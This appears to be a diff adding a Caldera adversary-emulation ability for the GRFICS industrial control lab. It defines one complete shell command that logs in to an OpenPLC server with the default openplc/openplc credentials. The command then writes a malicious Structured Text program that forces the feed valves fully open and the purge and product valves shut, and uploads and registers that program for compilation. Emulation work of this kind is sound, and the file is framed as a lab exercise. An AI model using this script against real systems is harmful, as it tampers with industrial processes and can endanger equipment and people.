@@ -1,0 +1,55 @@
+---
+
+- id: b2c3d4e5-2222-2222-2222-000000000003
+  name: OpenPLC - Upload Malicious Control Logic
+  description: |
+    GRFICS flow: (1) POST multipart to /upload-program with field name "file" — server
+    saves st_files/<random>.st and returns a form; (2) POST application/x-www-form-urlencoded
+    to /upload-program-action with prog_name, prog_descr, prog_file, epoch_time;
+    (3) OpenPLC redirects to compile-program?file=<name>. Writes /tmp/plc_last_st_file.txt
+    for the compile/start ability.
+  tactic: persistence
+  technique_id: T0889
+  technique_name: Modify Program
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      curl -s -c /tmp/plc_cookies.txt -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login" -o /dev/null &&
+      printf 'PROGRAM main1\n' > /tmp/malicious.st &&
+      printf '  VAR\n' >> /tmp/malicious.st &&
+      printf '    f1_valve_sp AT %%QW100 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    f2_valve_sp AT %%QW101 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    purge_valve_sp AT %%QW102 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    product_valve_sp AT %%QW103 : UINT;\n' >> /tmp/malicious.st &&
+      printf '    run_bit AT %%QX5.0 : BOOL := TRUE;\n' >> /tmp/malicious.st &&
+      printf '  END_VAR\n' >> /tmp/malicious.st &&
+      printf '  f1_valve_sp := 65535;\n' >> /tmp/malicious.st &&
+      printf '  f2_valve_sp := 65535;\n' >> /tmp/malicious.st &&
+      printf '  purge_valve_sp := 0;\n' >> /tmp/malicious.st &&
+      printf '  product_valve_sp := 0;\n' >> /tmp/malicious.st &&
+      printf '  run_bit := TRUE;\n' >> /tmp/malicious.st &&
+      printf 'END_PROGRAM\n' >> /tmp/malicious.st &&
+      printf 'CONFIGURATION Config0\n' >> /tmp/malicious.st &&
+      printf '  RESOURCE Res0 ON PLC\n' >> /tmp/malicious.st &&
+      printf '    TASK task0(INTERVAL := T#20ms, PRIORITY := 0);\n' >> /tmp/malicious.st &&
+      printf '    PROGRAM instance0 WITH task0 : main1;\n' >> /tmp/malicious.st &&
+      printf '  END_RESOURCE\n' >> /tmp/malicious.st &&
+      printf 'END_CONFIGURATION\n' >> /tmp/malicious.st &&
+      echo "ST file bytes:" && wc -c /tmp/malicious.st &&
+      curl -s -b /tmp/plc_cookies.txt -F "file=@/tmp/malicious.st"
+      "http://192.168.95.2:8080/upload-program"
+      -o /tmp/plc_upload_form.html &&
+      FN=$(grep -oE '[0-9]+[.]st' /tmp/plc_upload_form.html | head -1) &&
+      echo "PARSED_ST_FILENAME=$FN" &&
+      test -n "$FN" &&
+      curl -s -b /tmp/plc_cookies.txt -X POST "http://192.168.95.2:8080/upload-program-action"
+      -d "prog_name=malicious_lab"
+      -d "prog_descr=caldera_emulation"
+      -d "prog_file=$FN"
+      -d "epoch_time=$(date +%s)"
+      -o /tmp/plc_upload_action.html &&
+      echo "$FN" > /tmp/plc_last_st_file.txt &&
+      echo "UPLOAD_PROGRAM_ACTION_DONE"
+    timeout: 120
